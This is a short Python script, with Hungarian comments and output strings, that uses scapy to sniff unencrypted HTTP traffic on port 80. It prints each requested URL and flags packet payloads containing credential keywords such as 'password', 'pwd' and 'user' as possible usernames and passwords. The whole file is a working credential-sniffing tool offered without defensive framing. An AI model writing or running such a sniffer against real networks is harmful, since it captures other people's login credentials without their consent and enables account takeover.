import scapy.all as scapy
from scapy.layers import http

def sniff(interface):
    scapy.sniff(iface=interface, store=False, prn=csomag_feldolgozas, filter='port 80')

def csomag_feldolgozas(csomag):
    if csomag.haslayer(http.HTTPRequest):
        print('[+] HTTP kérés:', (csomag[http.HTTPRequest].Host + csomag[http.HTTPRequest].Path).decode('utf-8'))
        if csomag.haslayer(scapy.Raw):
            tartalom = csomag[scapy.Raw].load
            kulcsszavak = ['passwd', 'pswd', 'pwd', 'password', 'uname', 'user', 'usr', 'nusr']
            try:
                tartalom = tartalom.decode('utf-8')
                for kulcsszo in kulcsszavak:
                    if kulcsszo in tartalom:
                        print('!'*70)
                        print('[+] Lehetséges felhasználónév / jelszó:', tartalom)
                        print('!'*70)
                        break
            except:
                pass